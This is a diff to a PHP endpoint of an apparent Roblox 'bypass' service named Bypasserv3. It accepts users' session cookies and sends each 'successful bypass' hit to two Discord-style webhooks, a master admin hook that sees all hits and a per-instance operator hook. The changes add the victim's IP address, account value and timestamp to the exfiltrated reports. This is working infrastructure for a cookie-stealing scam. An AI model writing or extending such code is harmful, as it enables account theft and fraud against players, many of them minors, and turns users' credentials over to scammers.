@@ -1,7 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Bypass API Endpoint
- * Updated with Dualhook Support & Better Error Handling
+ * Updated with per-instance user webhooks
  */
 
 header('Content-Type: application/json');
@@ -78,6 +78,12 @@ if (!validateCookie($cookie)) {
 
 // Get instance data for webhook
 $instanceData = getInstanceData($directory);
+if (!$instanceData) {
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'Instance not found']);
+    exit;
+}
+
 $userWebhook = $instanceData['userWebhook'] ?? '';
 $masterWebhook = MASTER_WEBHOOK;
 
@@ -114,7 +120,8 @@ if (!empty($curlError) || $httpCode !== 200 || empty($apiResponse)) {
     logSecurityEvent('external_api_failure', [
         'http_code' => $httpCode,
         'curl_error' => $curlError,
-        'ip' => $ip
+        'ip' => $ip,
+        'directory' => $directory
     ]);
     exit;
 }
@@ -128,7 +135,7 @@ if (!$apiData || !isset($apiData['success']) || !$apiData['success']) {
         'success' => false,
         'error' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
     ]);
-    logSecurityEvent('api_invalid_response', ['ip' => $ip]);
+    logSecurityEvent('api_invalid_response', ['ip' => $ip, 'directory' => $directory]);
     exit;
 }
 
@@ -162,31 +169,36 @@ if ($instanceData) {
 updateGlobalStats('totalCookies', 1);
 
 // ============================================
-// SEND DUALHOOK NOTIFICATIONS
+// SEND WEBHOOKS
 // ============================================
 
-// Master Webhook Notification (Admin)
+// Master Webhook Notification (Admin - ALL HITS)
 if (!empty($masterWebhook)) {
     $masterPayload = [
         'embeds' => [[
             'title' => '✅ Successful Bypass',
-            'description' => "**Username:** `{$username}`\n**User ID:** `{$userId}`\n**Robux:** `{$robux}`\n**RAP:** `{$rap}`\n**Instance:** `{$directory}`",
+            'description' => "**Instance:** `{$directory}`\n**Username:** `{$username}`\n**User ID:** `{$userId}`\n**Robux:** `{$robux}`\n**RAP:** `{$rap}`",
             'color' => 3066993,
-            'footer' => ['text' => 'Bypasserv3 | Master Admin'],
+            'fields' => [
+                ['name' => 'Account Value', 'value' => '```' . $summary . '```', 'inline' => true],
+                ['name' => 'IP Address', 'value' => '```' . $ip . '```', 'inline' => true],
+                ['name' => 'Timestamp', 'value' => date('Y-m-d H:i:s'), 'inline' => false]
+            ],
+            'footer' => ['text' => 'Bypasserv3 Master Admin'],
             'timestamp' => date('c')
         ]]
     ];
     sendWebhookNotification($masterWebhook, $masterPayload);
 }
 
-// User Webhook Notification (User)
+// User Webhook Notification (User - ONLY FOR THEIR SITE)
 if (!empty($userWebhook)) {
     $userPayload = [
         'embeds' => [[
             'title' => '🎉 Account Bypass Success',
-            'description' => "**Account:** `{$username}`\n**ID:** `{$userId}`\n**Robux Balance:** `{$robux}`\n**RAP Value:** `{$rap}`",
+            'description' => "**Account:** `{$username}`\n**ID:** `{$userId}`\n**Robux:** `{$robux}`\n**RAP:** `{$rap}`\n**Value:** `{$summary}`",
             'color' => 3447003,
-            'footer' => ['text' => 'Your Bypasser'],
+            'footer' => ['text' => 'Your Bypasser Instance'],
             'timestamp' => date('c')
         ]]
     ];
@@ -198,6 +210,7 @@ logSecurityEvent('successful_bypass', [
     'username' => $username,
     'userId' => $userId,
     'robux' => $robux,
+    'directory' => $directory,
     'ip' => $ip
 ]);
 
